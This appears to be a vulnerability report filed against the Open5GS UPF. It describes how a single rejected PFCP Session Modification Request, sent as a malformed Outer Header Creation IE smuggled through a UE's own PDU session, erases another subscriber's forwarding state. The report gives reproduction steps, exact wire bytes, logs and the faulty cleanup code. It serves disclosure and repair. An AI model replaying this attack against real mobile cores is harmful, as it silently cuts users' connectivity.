The result is an enforced, silent denial of service from one well-formed message: the victim session's entire forwarding state is erased, all user-plane traffic for that session blackholes (UL and DL), the UPF emits GTP-U Error Indications for the dead tunnel — while the SMF and the UE still believe the PDU session is up (no release, no modify on the control plane).

Note this is **independent of peer ownership**: the destruction happens on the rejection path, so even the legitimate SMF triggering any rejected modification on its own session wipes it. A peer-ownership check (the fix for the accepted-path cross-association issues) does **not** fix this defect.

In our lab the N4 endpoint is reachable from the data plane (PFCP datagram as the payload of an uplink IP packet over the attacker's own PDU session; the gNB GTP-U-encapsulates it, the UPF decapsulates it onto its own N4 socket).

### Steps to reproduce

Lab: 
* Attacker UE `10.45.0.2`
* Benign peer UE `10.45.0.3` (both attached, each with a PDU session)
* UPF N4 `192.168.232.132:8805`
* gNB/N3 `192.168.232.140:2152`
* SMF `192.168.232.133`.

1. Measure baseline downlink delivery to `10.45.0.3` from the data-network
   side (ICMP echo): 5/5 replies.
2. From the attacker UE, smuggle a PFCP Association Setup Request (Node ID =
   `10.45.0.2`) to the UPF through the PDU session. UPF answers Cause 1.
3. Read the peer UE's UP F-SEID from the UPF log
   (`UE F-SEID[UP:0x6ab CP:0x444] ... IPv4[10.45.0.3]`) and confirm it is live
   with one no-op Session Modification Request (header SEID `0x6ab`, no IEs)
   — answered Cause 1 via the success path.
4. Send exactly **one** Session Modification Request, header SEID `0x6ab`,
   carrying one UpdateFAR IE (FAR ID 1, Apply Action = FORWARD) whose Update
   Forwarding Parameters contain exactly one Outer Header Creation IE with a
   deliberately **invalid mixed-bit description** (wire bytes `05 00`; only
   the pure GTP-U descriptions are decodable by Open5GS):

   | Field | Value |
   |---|---|
   | Header SEID | `0x6ab` (peer UE's UP F-SEID) |
   | UpdateFAR (IE 10) | FAR ID 1, Apply Action FORWARD (`0x0200`) |
   | Update Forwarding Parameters (IE 11) | Outer Header Creation (IE 84), description `05 00`, TEID `0x00000001`, IPv4 `192.168.232.140` |

5. Record the response cause, re-measure downlink delivery, inspect the victim
   UE's tunnel capture and the SMF/peer-UE logs.

### Logs (Attached)

[R6-upf-error-path-session-wipe.zip](https://github.com/user-attachments/files/31643350/R6-upf-error-path-session-wipe.zip)

The accepted association, the no-op success-path probe, then the single
rejected modification and its error-path signature (no success-path response
line afterwards):

```shell
08/30 11:53:20.584: [upf] INFO: PFCP associated [10.45.0.2]:8805 (../open5gs-src/src/upf/pfcp-sm.c:168)
08/30 11:53:20.886: [upf] DEBUG: Session Modification Response (../open5gs-src/src/upf/n4-build.c:91)   # no-op probe: success path, Cause 1
08/30 11:53:21.187: [upf] DEBUG: Session Modification Request (../open5gs-src/src/upf/n4-handler.c:258) # attack message, peer [10.45.0.2]:8805
08/30 11:53:21.187: [pfcp] ERROR: Unsupported Outer Header Creation Description (../open5gs-src/lib/pfcp/handler.c:1146)
# response: type 53, header SEID 0x444 (peer CP F-SEID), Cause 76 "Service not supported",
#           Offending-IE 0x54 (Outer Header Creation) — and NO success-path response line
```

The attack SMR's Outer Header Creation value bytes on the wire
(`driver_out.json` `sent_hex`, tail): `05000000 0001c0a8e88c` — description
`05 00`, TEID `0x00000001`, IPv4 `192.168.232.140`.

The attack request and its GTP-U smuggling are on the wire:
`capture-core-eth0-n4n3.pcap` carries the 52-byte Session Modification Request
inside GTP-U (outer `192.168.232.140:2152 -> 192.168.232.132:2152`, inner
`10.45.0.2:8805 -> 192.168.232.132:8805`, payload identical to the sent
datagram); no plain UDP/8805 datagram appears on the core wire.

Measured effect (id-matched ICMP probes, core -> peer `10.45.0.3`):

```text
N6 (core -> 10.45.0.3):   baseline 5/5 replies -> post-probe 0/5 (100% loss)
victim uesimtun0:         baseline 5 req / 5 replies -> post-probe empty (header-only pcap)
SMF log:                  no session release / modify — SMF still believes the session is up
peer UE log:              "PDU Session establishment is successful PSI[1] ... TUN interface[uesimtun0, 10.45.0.3] is up"
```

An independent second run (different lab window, peer session UP-SEID `0x170` / 368) shows the same wipe with its dataplane aftermath: the rejected request was answered Cause 76, and follow-up UpdateFAR probes on the same SEID — one per FAR-ID 1..5, starting 6 ms after the rejection — were each answered with `Cannot find FAR-ID[N] in PDR` (handler.c:1282; `FAR-ID[1]` at
`08:35:09.093`, `FAR-ID[2]` at `08:35:09.099`): the session's FARs were gone. 

The UPF then logged `Send Error Indication [TEID:0xa403] to [192.168.232.140]` (gtp-path.c) as downlink kept arriving with no matching
PDR. Peer loss was 100% in both directions and persisted for the whole observation window (~20 minutes) without any restore.

**Open5GS parses the 2-byte Outer Header Creation description with a raw little-endian struct copy, so the wire bytes `05 00` decode to the mixed-bit pattern it rejects (a 3GPP big-endian encoder places the same bits differently). The on-wire hex and the UPF log hexdump above are quoted verbatim.**

### Expected behaviour

A rejected update must not alter the session: only the offending IE's change is refused, the session's installed PDRs/FARs/URRs/QERs must be preserved untouched, and the error response must be sent against the intact session. `ogs_pfcp_sess_clear()` belongs to the legitimate session-removal paths, not to the modification error path.

### Observed Behaviour

The modification handler's error path tears down the whole session before answering:

```c
/* src/upf/n4-handler.c — upf_n4_handle_session_modification_request() */
...
cleanup:
    ogs_pfcp_sess_clear(&sess->pfcp);   /* n4-handler.c:440-444 — removes ALL
                                           PDRs/FARs/URRs/QERs of the resolved
                                           session (lib/pfcp/context.c:1283) */
    ogs_pfcp_send_error_message(...);   /* rejection answered after the wipe */
```

The rejection itself is correct — `lib/pfcp/handler.c` (outer-header-creation parsing, error at handler.c:1146) refuses non-pure GTP-U descriptions with Cause 76 + Offending-IE — but the handler routes **any** rejection through the `cleanup:` label above, so the error answer and the session destruction are the same code path. Nothing scopes the cleanup to the failed update; nothing
restores the previous state afterwards.

The target session is resolved from the header SEID alone (`src/upf/pfcp-sm.c:197`, via `upf_sess_find_by_upf_n4_seid()`,
`src/upf/context.c:290`), so the poisoned request can be addressed to any live session; but note the wipe occurs even
when the requester *is* the session's owner, so this defect is independent of the missing association-ownership check reported separately.


### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM
